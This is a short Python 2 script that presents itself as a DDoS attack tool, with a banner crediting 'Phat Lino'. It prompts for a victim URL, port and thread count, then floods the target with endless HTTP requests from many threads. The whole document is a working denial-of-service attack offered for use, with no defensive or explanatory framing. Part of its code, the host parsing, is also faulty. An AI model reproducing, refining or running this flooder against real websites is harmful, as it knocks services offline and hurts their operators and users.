import os
import urlparse
import urllib
import urllib2
import threading
import httplib
os.system("color b")
os.system("title ......:::: Phat Lino ::::......")
print"""
 ____  ____       ____       _   _   _             _    
|  _ \|  _ \  ___/ ___|     / \ | |_| |_ __ _  ___| | __
| | | | | | |/ _ \___ \    / _ \| __| __/ _` |/ __| |/ /
| |_| | |_| | (_) |__) |  / ___ \ |_| || (_| | (__|   < 
|____/|____/ \___/____/  /_/   \_\__|\__\__,_|\___|_|\_\ 
                              ~~> Tool DDos By PL2K2 <~~
                                  ~~> Creat By Phat Lino <~~                     
"""
url_victim = raw_input("< Victim: ")
host_victim = url_victim.replace("http://","").split("/")[1]
port_victim = raw_input("< Port:  ")
dame_victim = input("< Dame:  ")
class attack(threading.Thread):
	def run(self):
            while 1:
                urllib.urlopen(url_victim)
                urllib2.urlopen(url_victim)
                urlparse.urlparse(url_victim)
                httplib.HTTPConnection(host_victim, port_victim, timeout=1)
                print"...!!!Phat Lino Attacking Website Security Now...!!!"
for i in range(dame_victim):
      t = attack()
      t.start()